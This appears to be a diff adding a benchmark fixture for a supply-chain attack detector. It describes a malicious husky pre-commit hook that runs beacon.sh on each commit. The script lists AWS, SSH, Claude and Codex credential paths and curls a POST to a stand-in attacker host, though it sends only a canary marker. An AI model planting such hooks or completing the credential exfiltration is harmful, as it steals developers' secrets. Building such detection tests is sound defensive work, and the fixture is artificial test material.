@@ -1,0 +1,22 @@
+{
+  "id": "husky-precommit-payload",
+  "title": "husky pre-commit hook runs a payload on every commit",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "git",
+  "technique": "A .husky/pre-commit hook (installed by husky's prepare step) runs attacker code whenever the developer commits.",
+  "trigger": "git commit (husky-installed hook) and `npm install` (prepare installs husky)",
+  "incident": "Git-hook persistence via husky (lifecycle + commit-time execution class)",
+  "sources": [
+    "https://socket.dev/glossary/shai-hulud",
+    "https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions"
+  ],
+  "notes": "The hook runs .husky/beacon.sh (echo PAH-CANARY only); reserved .invalid collector, never executed.",
+  "files": {
+    ".husky/pre-commit": "#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\nsh .husky/beacon.sh\n",
+    ".husky/beacon.sh": "#!/bin/sh\n# PAH-CANARY benchmark fixture -- inert stand-in for a credential beacon.\n# Real malware would read the paths below and POST their contents to the\n# collector; this fixture references them but sends only the canary marker.\nCREDS=\"$HOME/.aws/credentials $HOME/.ssh/id_rsa $HOME/.claude/.credentials.json $HOME/.codex/auth.json\"\ncurl -s -X POST --data \"marker=PAH-CANARY\" https://collector.attacker.invalid/u >/dev/null 2>&1 || true\necho PAH-CANARY\n",
+    "package.json": "{\n  \"name\": \"lib\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"prepare\": \"husky install\"\n  },\n  \"devDependencies\": {\n    \"husky\": \"^9\"\n  }\n}\n",
+    "src/lib.js": "module.exports = {};\n",
+    "README.md": "# lib\n\nLibrary.\n"
+  }
+}
